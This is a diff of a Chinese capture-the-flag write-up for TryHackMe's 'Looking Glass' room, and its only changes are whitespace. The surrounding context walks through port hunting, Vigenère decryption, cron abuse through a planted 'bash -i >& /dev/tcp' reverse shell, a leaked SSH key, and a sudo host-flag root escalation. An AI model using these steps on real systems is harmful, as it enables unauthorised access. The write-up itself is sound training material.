@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme]
-└─# nmap -sV -Pn 10.10.189.27    
+└─#  nmap -sV -Pn 10.10.189.27    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-08 04:11 EDT
 Nmap scan report for 10.10.163.86
@@ -103,7 +103,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 我们当然不需要一个个端口去测试，只需要不停的折半查找，那么在对数次数内我们就可以找到真实端口
 ```
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12000
+└─#  ssh root@10.10.189.27 -p 12000
 The authenticity of host '[10.10.189.27]:12000 ([10.10.189.27]:12000)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -112,7 +112,7 @@ Lower
 Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12174
+└─#  ssh root@10.10.189.27 -p 12174
 The authenticity of host '[10.10.189.27]:12174 ([10.10.189.27]:12174)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -121,7 +121,7 @@ Higher
 Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12100
+└─#  ssh root@10.10.189.27 -p 12100
 The authenticity of host '[10.10.189.27]:12100 ([10.10.189.27]:12100)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -130,7 +130,7 @@ Higher
 Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12050
+└─#  ssh root@10.10.189.27 -p 12050
 The authenticity of host '[10.10.189.27]:12050 ([10.10.189.27]:12050)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -139,7 +139,7 @@ Higher
 Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12025
+└─#  ssh root@10.10.189.27 -p 12025
 The authenticity of host '[10.10.189.27]:12025 ([10.10.189.27]:12025)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -148,7 +148,7 @@ Lower
 Connection to 10.10.189.27 closed.
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12030
+└─#  ssh root@10.10.189.27 -p 12030
 The authenticity of host '[10.10.189.27]:12030 ([10.10.189.27]:12030)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -157,12 +157,12 @@ Higher
 Connection to 10.10.189.27 closed.
 
 ```
-#最后定位到端口：```12027```
+# 最后定位到端口：```12027```
 注意，这个端口每次reboot的时候都会变化
 
 ```
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh root@10.10.189.27 -p 12027
+└─#  ssh root@10.10.189.27 -p 12027
 The authenticity of host '[10.10.189.27]:12027 ([10.10.189.27]:12027)' can't be established.
 RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -250,7 +250,7 @@ Egf bwl qffl vaewz ovxztiql.
 我们观察，期中```thealphabetcipher```这个字符串在解密密文里反复出现，所以这个就是我们的解密秘钥
 
 
-#我们用上面的秘钥解密整个加密诗文
+# 我们用上面的秘钥解密整个加密诗文
 
 ```
 Twas brillig, and the slithy toves
@@ -292,7 +292,7 @@ Your secret is bewareTheJabberwock
 
 secret是：```bewareTheJabberwock```
 
-#ssh里填入secret，得到一个ssh的登陆凭证
+# ssh里填入secret，得到一个ssh的登陆凭证
 小声bb：这个ssh密码每次reboot的时候也会变化，所以万不得已千万不要重启，不然上面猜端口又要重来一次。。。
 ```
 Enter Secret:
@@ -301,11 +301,11 @@ jabberwock:InventedBackwardsGreedilyYours
 ```
 
 
-#user 1：jabberwock
+# user 1：jabberwock
 登陆ssh，查看user.txt
 ```
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh jabberwock@10.10.189.27         
+└─#  ssh jabberwock@10.10.189.27         
 jabberwock@10.10.189.27's password: 
 Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
 jabberwock@looking-glass:~$ ls
@@ -318,7 +318,7 @@ jabberwock@looking-glass:~$ cat user.txt
 
 去到[这个网站](https://string-functions.com/reverse.aspx),得到一个reverse的串就是user flag
 
-#查看本用户的root权限，可以使用reboot命令
+# 查看本用户的root权限，可以使用reboot命令
 
 ```
 jabberwock@looking-glass:~$ sudo -l
@@ -334,21 +334,21 @@ User jabberwock may run the following commands on looking-glass:
 
 ```
 jabberwock@looking-glass:~$ cat /etc/crontab 
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
+#  /etc/crontab: system-wide crontab
+#  Unlike any other crontab you don't have to run the `crontab'
+#  command to install the new version when you edit this file
+#  and files in /etc/cron.d. These files also have username fields,
+#  that none of the other crontabs do.
 
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-# m h dom mon dow user  command
+#  m h dom mon dow user  command
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-#
+# 
 @reboot tweedledum bash /home/jabberwock/twasBrillig.sh
 ```
 
@@ -363,10 +363,10 @@ bash -i >& /dev/tcp/10.13.21.169/4242 0>&1
 另外开启一个监听窗口，reboot这个机器....
 
 拿到另一个用户```tweedledum```的shell
-#user 2 tweedledum
+# user 2 tweedledum
 ```
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
+└─#  nc -lnvp 4242                                                                                                                                                                                                                       1 ⨯
 listening on [any] 4242 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.189.27] 52236
 bash: cannot set terminal process group (881): Inappropriate ioctl for device
@@ -465,7 +465,7 @@ humptydumpty:x:1004:1004:,,,:/home/humptydumpty:/bin/bash
 alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
 ```
 
-#user 3 humptydumpty
+# user 3 humptydumpty
 
 切换到humptydumpty的账号
 ```
@@ -527,13 +527,13 @@ k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
 ```
 
 把上面信息复制到本地成id_rsa文件，用ssh登录alice账号
-#user 4 alice
+# user 4 alice
 ```
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# chmod 600 id_rsa         
+└─#  chmod 600 id_rsa         
                                                                                                                                                                                                                                             
 ┌──(root💀kali)-[~/tryhackme/lookingglass]
-└─# ssh -i id_rsa alice@10.10.189.27  
+└─#  ssh -i id_rsa alice@10.10.189.27  
 Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
 alice@looking-glass:~$ id
 uid=1005(alice) gid=1005(alice) groups=1005(alice)
@@ -563,14 +563,14 @@ alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
 >/bin/bash 可以执行的命令
 
 
-#提权到root。
+# 提权到root。
 >-h参数有帮助菜单（display gelp message and exit），也有在主机上运行命令的意思（run command on host）
 ```
 alice@looking-glass:/$ sudo -h ssalg-gnikool /bin/bash
 sudo: unable to resolve host ssalg-gnikool
-root@looking-glass:/# id
+root@looking-glass:/#  id
 uid=0(root) gid=0(root) groups=0(root)
-root@looking-glass:/# cat /root/root.txt
+root@looking-glass:/#  cat /root/root.txt
 }f3dae6dec817ad10b750d79f6b7332cb{mht
 ```
 
